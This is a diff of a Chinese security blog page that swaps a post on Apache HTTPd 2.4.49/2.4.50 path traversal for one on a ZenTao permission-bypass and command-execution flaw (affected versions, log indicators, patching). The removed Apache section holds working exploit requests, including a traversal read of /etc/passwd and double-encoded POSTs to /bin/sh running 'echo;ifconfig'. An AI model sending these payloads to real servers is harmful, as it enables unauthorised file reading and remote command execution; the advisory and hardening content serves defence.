@@ -4,7 +4,7 @@
   <!-- 元数据 -->
   <meta charset="utf-8">
   <link rel="icon" href="">
-  <title>Apache 2.4.49 | Love is a Moment Story</title>
+  <title>禅道系统权限绕过与命令执行漏洞（附POC）~ | Love is a Moment Story</title>
   <meta name="author" content="zhang rui" />
   <meta http-equiv="Cache-Control" content="no-transform" />
   <meta http-equiv="Cache-Control" content="no-siteapp" />
@@ -13,20 +13,19 @@
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
   <meta name="format-detection" content="telphone=no, email=no" />
   
-    <meta name="keywords" content="Apache 2.4.49" />
+    <meta name="keywords" content="" />
   
-  <meta name="description" content="漏洞描述 Apache HTTPd是Apache基金会开源的一款流行的HTTP服务器。2021年10月8日Apache HTTPd官方发布安全更新，披露了CVE-2021-42013 Apache HTTPd 2.4.49&#x2F;2.4.50 路径穿越漏洞。由于对CVE-2021-41773 Apache HTTPd 2.4.49 路径穿越漏洞的修复不完善，攻击者可构造恶意请求绕过补丁，利用穿越漏洞读取">
+  <meta name="description" content="漏洞描述禅道是一款国产的开源项目管理软件。它集产品管理、项目管理、质量管理、文档管理、组织管理和事务管理于一体，是一款专业的研发项目管理软件，完整覆盖了研发项目管理的核心流程，也是国内最流行的项目管理软件。 官方链接：    1https:&#x2F;&#x2F;www.zentao.net&#x2F;index.html    该系统在2023年初被爆出在野命令执行漏洞，官方已于2023年1月12日发布了漏洞修复补丁。该漏洞">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Apache 2.4.49">
-<meta property="og:url" content="http://example.com/2021/10/15/Apache-2-4-49/index.html">
+<meta property="og:title" content="禅道系统权限绕过与命令执行漏洞（附POC）~">
+<meta property="og:url" content="http://example.com/2023/01/18/%E7%A6%85%E9%81%93%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E4%B8%8E%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88%E9%99%84POC%EF%BC%89/index.html">
 <meta property="og:site_name" content="Love is a Moment Story">
-<meta property="og:description" content="漏洞描述 Apache HTTPd是Apache基金会开源的一款流行的HTTP服务器。2021年10月8日Apache HTTPd官方发布安全更新，披露了CVE-2021-42013 Apache HTTPd 2.4.49&#x2F;2.4.50 路径穿越漏洞。由于对CVE-2021-41773 Apache HTTPd 2.4.49 路径穿越漏洞的修复不完善，攻击者可构造恶意请求绕过补丁，利用穿越漏洞读取">
+<meta property="og:description" content="漏洞描述禅道是一款国产的开源项目管理软件。它集产品管理、项目管理、质量管理、文档管理、组织管理和事务管理于一体，是一款专业的研发项目管理软件，完整覆盖了研发项目管理的核心流程，也是国内最流行的项目管理软件。 官方链接：    1https:&#x2F;&#x2F;www.zentao.net&#x2F;index.html    该系统在2023年初被爆出在野命令执行漏洞，官方已于2023年1月12日发布了漏洞修复补丁。该漏洞">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/null">
-<meta property="article:published_time" content="2021-10-15T02:09:10.000Z">
-<meta property="article:modified_time" content="2022-12-06T09:07:32.218Z">
+<meta property="article:published_time" content="2023-01-17T23:24:01.000Z">
+<meta property="article:modified_time" content="2023-01-18T03:31:08.547Z">
 <meta property="article:author" content="zhang rui">
-<meta property="article:tag" content="Apache 2.4.49">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/null">
 <meta name="twitter:site" content="@null">
@@ -172,17 +171,17 @@
     <div class="kratos-hentry kratos-post-inner clearfix">
         <header class="kratos-entry-header">
             
-                <h1 class="kratos-entry-title text-center">Apache 2.4.49</h1>
+                <h1 class="kratos-entry-title text-center">禅道系统权限绕过与命令执行漏洞（附POC）~</h1>
             
             
             <ul class="kratos-post-meta text-center">
-                <li><i class="fa fa-calendar"></i> 2021-10-15</li>
+                <li><i class="fa fa-calendar"></i> 2023-01-18</li>
                 <li><i class="fa fa-user"></i> 作者 zhang rui</li>
                 <li>
                     <i class="fa fa-edit"></i> 
                     
                     
-                        1072
+                        1001
                     
                     字
                 </li>
@@ -191,42 +190,87 @@
         </header>
         <div class="kratos-post-content">
             <div id="expire-alert" class="alert alert-warning hidden" role="alert">
-                本文最后编辑于 <time datetime="1670317652218"></time> 前，其中的内容可能需要更新。
+                本文最后编辑于 <time datetime="1674012668547"></time> 前，其中的内容可能需要更新。
             </div>
             
                 <div class="kratos-post-inner-toc">
-                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Apache-2-4-49-CVE-2021-41773"><span class="toc-number">1.</span> <span class="toc-text">Apache 2.4.49 (CVE-2021-41773)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Apache-2-4-50-CVE-2021-42013"><span class="toc-number">2.</span> <span class="toc-text">Apache 2.4.50 (CVE-2021-42013)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%B9%E9%87%8F%E5%A4%9A%E7%BA%BF%E7%A8%8B%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">批量多线程检测工具：</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">漏洞描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="toc-number">2.</span> <span class="toc-text">影响范围</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%AF%B4%E6%98%8E"><span class="toc-number">3.</span> <span class="toc-text">漏洞说明</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">4.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A0%E5%9B%BA%E6%8E%AA%E6%96%BD"><span class="toc-number">5.</span> <span class="toc-text">加固措施</span></a></li></ol>
                 </div>
             
             <hr />
-            <p><strong>漏洞描述</strong></p>
-<p>Apache HTTPd是Apache基金会开源的一款流行的HTTP服务器。2021年10月8日Apache HTTPd官方发布安全更新，披露了CVE-2021-42013 Apache HTTPd 2.4.49/2.4.50 路径穿越漏洞。由于对CVE-2021-41773 Apache HTTPd 2.4.49 路径穿越漏洞的修复不完善，攻击者可构造恶意请求绕过补丁，利用穿越漏洞读取到Web目录之外的其他文件。同时若Apache HTTPd开启了cgi支持，攻击者可构造恶意请求执行命令，控制服务器。</p>
-<p><strong>影响版本</strong></p>
-<p>Apache HTTPd 2.4.49/2.4.50版本</p>
-<p><strong>验证过程</strong></p>
-<p>Apache HTTPd 2.4.49 任意文件读取漏洞验证：</p>
-<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20211015101123969.png" alt="image-20211015101123969"></p>
-<p>GET数据包：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1</span><br><span class="line">Host: host</span><br><span class="line">Content-Length: 2</span><br></pre></td></tr></table></figure>
+            <h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a><strong>漏洞描述</strong></h2><p>禅道是一款国产的开源项目管理软件。它集产品管理、项目管理、质量管理、文档管理、组织管理和事务管理于一体，是一款专业的研发项目管理软件，完整覆盖了研发项目管理的核心流程，也是国内最流行的项目管理软件。</p>
+<p><strong>官方链接：</strong></p>
+<ul>
+<li></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.zentao.net/index.html</span><br></pre></td></tr></table></figure>
 
-<p>Apache HTTPd 2.4.49 命令执行测试，未能成功回显命令，回显了bash报错信息。</p>
-<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20211015101211618.png" alt="image-20211015101211618"></p>
-<p>POST数据包：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">POST /cgi-bin/%2e%%32%65/%2e%%32%65/%2e%%32%65/%2e%%32%65/%2e%%32%65/bin/sh HTTP/1.1</span><br><span class="line">Host: host</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 13</span><br><span class="line"> </span><br><span class="line">echo;ifconfig</span><br></pre></td></tr></table></figure>
 
-<p>Apache HTTPd 2.4.50 命令执行测试：</p>
-<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20211015101238669.png" alt="image-20211015101238669"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh HTTP/1.1</span><br><span class="line">Host: host</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 13</span><br><span class="line"> </span><br><span class="line">echo;ifconfig</span><br></pre></td></tr></table></figure>
 
-<p>一个图片总结这次ApacheHTTPd 2.4.50版本修复不完善。</p>
-<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20211015101302065.png" alt="image-20211015101302065"></p>
-<p><strong>修复建议</strong></p>
-<p>建议使用Apache HTTPd 2.4.49 与Apache HTTPd 2.4.50 版本的服务器更新Apache HTTPd 版本至最新。</p>
-<p><strong>检测工具</strong></p>
-<h2 id="Apache-2-4-49-CVE-2021-41773"><a href="#Apache-2-4-49-CVE-2021-41773" class="headerlink" title="Apache 2.4.49 (CVE-2021-41773)"></a>Apache 2.4.49 (CVE-2021-41773)</h2><h2 id="Apache-2-4-50-CVE-2021-42013"><a href="#Apache-2-4-50-CVE-2021-42013" class="headerlink" title="Apache 2.4.50 (CVE-2021-42013)"></a>Apache 2.4.50 (CVE-2021-42013)</h2><h2 id="批量多线程检测工具："><a href="#批量多线程检测工具：" class="headerlink" title="批量多线程检测工具："></a>批量多线程检测工具：</h2><p>Github地址：</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/inbug-team/CVE-2021-41773_CVE-2021-42013">https://github.com/inbug-team/CVE-2021-41773_CVE-2021-42013</a></p>
-<p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20211015101457783.png" alt="image-20211015101457783"></p>
-<p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/df0e622806a60f52f351f30127ad7944.png" alt="df0e622806a60f52f351f30127ad7944"></p>
+<p>该系统在2023年初被爆出在野命令执行漏洞，官方已于2023年1月12日发布了漏洞修复补丁。该漏洞是由于禅道项目管理系统权限认证存在缺陷导致，攻击者可利用该漏洞在未授权的情况下，通过权限绕过在服务器执行任意命令。</p>
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20230118112816475.png" alt="image-20230118112816475"></p>
+<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a><strong>影响范围</strong></h2><table>
+<thead>
+<tr>
+<th><strong>禅道系统</strong></th>
+<th><strong>影响版本</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>开源版</td>
+<td>17.4以下的未知版本&lt;=version&lt;=18.0.beta1</td>
+</tr>
+<tr>
+<td>旗舰版</td>
+<td>3.4以下的未知版本&lt;=version&lt;=4.0.beta1</td>
+</tr>
+<tr>
+<td>企业版</td>
+<td>7.4以下的未知版本&lt;=version&lt;=8.0.beta1 8.0.beta</td>
+</tr>
+</tbody></table>
+<h2 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a><strong>漏洞说明</strong></h2><p><strong>漏洞类型：</strong>命令执行、权限绕过</p>
+<p><strong>漏洞危害：</strong>攻击者利用此漏洞可实现任意执行命令</p>
+<p><strong>漏洞编号：</strong>CVE暂无，<strong>其他编号</strong>QVD-2023-1953</p>
+<p>**<em>*CVSS 3.1*</em>**评级：****9.8分</p>
+<p><strong>风险等级：</strong>高危</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a><strong>漏洞复现</strong></h2><p>奇安信CERT：</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/1mtwZURvGTmXBvXrlIrNyUjyw3h1tDJj7HxtyU0JCHsatboPhNf8YQ0xxPmQ8vfqTIs59YEU5R0mz9viciaUhrmA/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1&retryload=1" alt="图片"></p>
+<p>烽火台实验室：</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxeLEwohtsU3f11iaibgYxzeFoXHABGBF5MoSOCPgQgqrkX4SRHEQIdsyA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic&retryload=1" alt="图片"></p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=wxpic" alt="图片"></p>
+<p><strong>漏洞检测</strong></p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=wxpic" alt="图片"></p>
+<p>以开源版禅道为例：</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/VvfsuOanecp4xynI9oIibOsbrEz0EiarQHvgS3brIqlKvJSJQpwmmiaxxqzaUHIPeW87Pk50Uia7M15icr4ayicTt6qw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic&retryload=1" alt="图片"></p>
+<p>可以在不登录的情况下查看网页源代码：</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/VvfsuOanecp4xynI9oIibOsbrEz0EiarQHtDNRYL97YVnU7IljxvNLCqeP2KEicRlUPFUMl8XPXlXD4ibfuOGicbxNA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic&retryload=1" alt="图片"></p>
+<p>若已登录，也可以在右下角查看禅道版本：</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/VvfsuOanecp4xynI9oIibOsbrEz0EiarQH5dhRzFZyojb16T8ZicTsJSJWTicNj8HBdHYuHYEr1vMslbmSEWjJvQqA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic&retryload=1" alt="图片"></p>
+<p>若版本在影响范围内，则系统有可能受该漏洞影响。</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=wxpic" alt="图片"></p>
+<p><strong>攻击排查</strong></p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=wxpic" alt="图片"></p>
+<p>1、以Windows举例，用户可通过排查系统中日志是否存在以下内容，若存在，则说明系统可能遭受到攻击：</p>
+<ul>
+<li></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">misc-captcha-user.html</span><br></pre></td></tr></table></figure>
+
+<p>2、攻击者可能会使用一个空白用户名来创建一个代码库名为12346的操作，如下图所示，若存在该操作，则系统可能遭到攻击。</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/VvfsuOanecp4xynI9oIibOsbrEz0EiarQH6iavjk4YQ5ib0Oo6uOTYD0TUvuEYMlnIviafEhYrSEr3XkaoG9AxrrFGA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic" alt="图片"></p>
+<h2 id="加固措施"><a href="#加固措施" class="headerlink" title="加固措施"></a><strong>加固措施</strong></h2><p><img src="https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=wxpic" alt="图片"></p>
+<p><strong>1、进行官方升级:</strong></p>
+<p>具体升级方法</p>
+<ul>
+<li></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.zentao.net/book/zentaoprohelp/41.html</span><br></pre></td></tr></table></figure>
+
+<p><strong>2、安全产品升级:</strong></p>
+<p>部分厂商安全产品具备识别该漏洞功能，进行版本升级至最新版。</p>
+<p><strong>3、临时防护措施：</strong></p>
+<p>可在module/common/model.php文件中 echo $endResponseException-&gt;getContent();后面加上exit(); 来修复权限绕过漏洞。</p>
 
         </div>
         
@@ -280,7 +324,7 @@
     <script type="text/javascript">
         $(()=>{
             new QRCode("wechat-qr", {
-                text: "http://example.com/2021/10/15/Apache-2-4-49/",
+                text: "http://example.com/2023/01/18/%E7%A6%85%E9%81%93%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E4%B8%8E%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88%E9%99%84POC%EF%BC%89/",
                 width: 150,
                 height: 150,
                 correctLevel : QRCode.CorrectLevel.H
@@ -292,10 +336,14 @@
             const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
             const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
             const twitterBase   = "https://twitter.com/intent/tweet?";
-            const hostUrl       = "http://example.com/2021/10/15/Apache-2-4-49/";
-            const title         = "「Apache 2.4.49」";
-            const excerpt       = `漏洞描述
-Apache HTTPd是Apache基金会开源的一款流行的HTTP服务器。2021年10月8日Apache HTTPd官方发布安全更新，披露了CVE-2021-42013 Apache HTTPd 2.4.49/2.4.5...`;
+            const hostUrl       = "http://example.com/2023/01/18/%E7%A6%85%E9%81%93%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E4%B8%8E%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88%E9%99%84POC%EF%BC%89/";
+            const title         = "「禅道系统权限绕过与命令执行漏洞（附POC）~」";
+            const excerpt       = `漏洞描述禅道是一款国产的开源项目管理软件。它集产品管理、项目管理、质量管理、文档管理、组织管理和事务管理于一体，是一款专业的研发项目管理软件，完整覆盖了研发项目管理的核心流程，也是国内最流行的项目管理软件。
+官方链接：
+
+
+
+1htt...`;
             let _URL;
             switch (dest) {
                 case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
@@ -314,10 +362,10 @@ Apache HTTPd是Apache基金会开源的一款流行的HTTP服务器。2021年10�
             <div class="footer-tag clearfix">
                 <div class="pull-left">
                 <i class="fa fa-tags"></i>
-                    <a class="tag-none-link" href="/tags/Apache-2-4-49/" rel="tag">Apache 2.4.49</a>
+                    
                 </div>
                 <div class="pull-date">
-                <span>最后编辑：2022-12-06</span>
+                <span>最后编辑：2023-01-18</span>
                 </div>
             </div>
         </footer>
@@ -326,12 +374,12 @@ Apache HTTPd是Apache基金会开源的一款流行的HTTP服务器。2021年10�
         <nav class="navigation post-navigation clearfix" role="navigation">
             
             <div class="nav-previous clearfix">
-                <a title=" Spring Boot Actuator未授权访问利用实战利用" href="/2021/09/17/Spring Boot Actuator未授权访问利用实战利用/">&lt; 上一篇</a>
+                <a title=" 个人渗透测试常用方法总结" href="/2023/01/13/个人渗透测试常用方法总结/">&lt; 上一篇</a>
             </div>
             
             
             <div class="nav-next clearfix">
-                <a title=" 工控安全CTF入门小记" href="/2021/11/18/工控安全CTF入门小记/">下一篇 &gt;</a>
+                <a title=" clash最新远程代码执行漏洞" href="/2023/01/18/clash最新远程代码执行漏洞/">下一篇 &gt;</a>
             </div>
             
         </nav>
@@ -341,8 +389,8 @@ Apache HTTPd是Apache基金会开源的一款流行的HTTP服务器。2021年10�
 
 <script>
     var disqus_config = function () {
-        this.page.url = 'http://example.com/2021/10/15/Apache-2-4-49/';  // Replace PAGE_URL with your page's canonical URL variable
-        this.page.identifier = '2021/10/15/Apache-2-4-49/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+        this.page.url = 'http://example.com/2023/01/18/%E7%A6%85%E9%81%93%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E4%B8%8E%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88%E9%99%84POC%EF%BC%89/';  // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = '2023/01/18/禅道系统权限绕过与命令执行漏洞（附POC）/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
     };
     var load_comm = () => {
         if (typeof DISQUS == 'undefined') {
@@ -354,8 +402,8 @@ Apache HTTPd是Apache基金会开源的一款流行的HTTP服务器。2021年10�
             DISQUS.reset({
                 reload: true,
                 config: function () {  
-                    this.page.url = 'http://example.com/2021/10/15/Apache-2-4-49/';  // Replace PAGE_URL with your page's canonical URL variable
-                    this.page.identifier = '2021/10/15/Apache-2-4-49/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+                    this.page.url = 'http://example.com/2023/01/18/%E7%A6%85%E9%81%93%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E4%B8%8E%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88%E9%99%84POC%EF%BC%89/';  // Replace PAGE_URL with your page's canonical URL variable
+                    this.page.identifier = '2023/01/18/禅道系统权限绕过与命令执行漏洞（附POC）/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
                 }
             });
         }
@@ -403,7 +451,7 @@ Apache HTTPd是Apache基金会开源的一款流行的HTTP服务器。2021年10�
         <span class="toc-progress-bar"></span>
     </h4>
     <div class="textwidget">
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Apache-2-4-49-CVE-2021-41773"><span class="toc-text">Apache 2.4.49 (CVE-2021-41773)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Apache-2-4-50-CVE-2021-42013"><span class="toc-text">Apache 2.4.50 (CVE-2021-42013)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%B9%E9%87%8F%E5%A4%9A%E7%BA%BF%E7%A8%8B%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7%EF%BC%9A"><span class="toc-text">批量多线程检测工具：</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="toc-text">漏洞描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="toc-text">影响范围</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%AF%B4%E6%98%8E"><span class="toc-text">漏洞说明</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A0%E5%9B%BA%E6%8E%AA%E6%96%BD"><span class="toc-text">加固措施</span></a></li></ol>
     </div>
 </aside>
                 
